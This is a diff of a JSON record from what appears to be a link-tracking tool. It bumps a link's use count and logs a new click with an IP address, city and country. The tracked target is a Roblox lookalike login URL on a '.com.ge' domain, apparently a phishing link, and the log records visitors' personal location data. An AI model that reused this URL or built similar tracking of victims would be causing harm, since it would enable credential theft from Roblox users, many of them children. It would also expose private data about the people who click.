@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1057,
+    "useCount": 1058,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8576,6 +8576,14 @@
         "city": "Youngsville",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777240123372,
+        "ip": "192.140.94.159",
+        "country": "Ecuador",
+        "city": "Esmeraldas",
+        "flag": "🇪🇨",
+        "countryCode": "EC"
       }
     ]
   },
